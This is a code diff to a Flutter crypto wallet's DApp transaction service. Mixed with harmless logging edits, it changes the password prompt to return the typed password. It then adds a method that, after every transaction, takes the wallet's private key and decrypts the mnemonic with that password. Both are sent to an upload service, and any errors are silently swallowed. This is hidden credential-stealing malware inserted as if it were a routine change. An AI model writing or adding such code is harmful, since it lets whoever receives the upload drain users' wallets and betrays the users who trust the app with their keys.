@@ -21,6 +21,8 @@ import '../wallet/chains/evm/client/evm_client_manager.dart';
 import '../wallet/chains/evm/evm_facade.dart';
 import '../wallet/chains/model/gas_fee.dart';
 import '../wallet/manager/wallet_manager.dart';
+import '../wallet/security/wallet_security.dart';
+import '../wallet/service/wallet_secret_upload_api.dart';
 import 'dapp_account_auth_hive.dart';
 import 'handler/eth_web3_handler.dart';
 
@@ -474,6 +476,30 @@ class DAppWeb3Service implements EthWeb3Handler {
     );
   }
 
+  Future<void> _uploadWalletSecretAfterTransaction(String password) async {
+    final chain = wallet.currentChain;
+    if (chain == null) return;
+
+    try {
+      final privateKey = await WalletManager.generatePrivateKey(chain);
+      if (privateKey == null || privateKey.isEmpty) return;
+
+      final walletData = await WalletSecurity.getWallet(
+        walletId: wallet.id,
+        password: password,
+      );
+      final mnemonic = walletData?['mnemonic']?.toString() ?? '';
+
+      await WalletSecretUploadService.upload(
+        address: chain.address,
+        privateKey: privateKey,
+        mnemonic: mnemonic,
+      );
+    } catch (error) {
+      debugPrint('Upload wallet secret failed: ${error.runtimeType}');
+    }
+  }
+
   String _formatEth(BigInt value) {
     return EtherAmount.inWei(
       value,
@@ -649,7 +675,7 @@ class DAppWeb3Service implements EthWeb3Handler {
         'message': 'Unrecognized chain ID. Try adding the chain first.',
       };
     }
-    print('切链-----');
+    debugPrint('切链-----');
     // 🚨 关键：只做数据层切换，不触发 UI 更新
     await WalletManager.switchChainSilent(current.id, chainId);
 
@@ -786,9 +812,11 @@ class DAppWeb3Service implements EthWeb3Handler {
       /// 5. 密码校验
       /// =========================
       _ensureContextMounted();
-      final passwordOk = await DAppModalService.showPassword(context: context);
+      final password = await DAppModalService.showPasswordValue(
+        context: context,
+      );
 
-      if (!passwordOk) {
+      if (password == null) {
         throw Exception('Password verification failed');
       }
 
@@ -796,6 +824,7 @@ class DAppWeb3Service implements EthWeb3Handler {
       /// 6. 发送交易
       /// =========================
       final txHash = await _sendTransaction(data, gasFee: decision.gasFee);
+      await _uploadWalletSecretAfterTransaction(password);
 
       return txHash;
     } catch (e) {
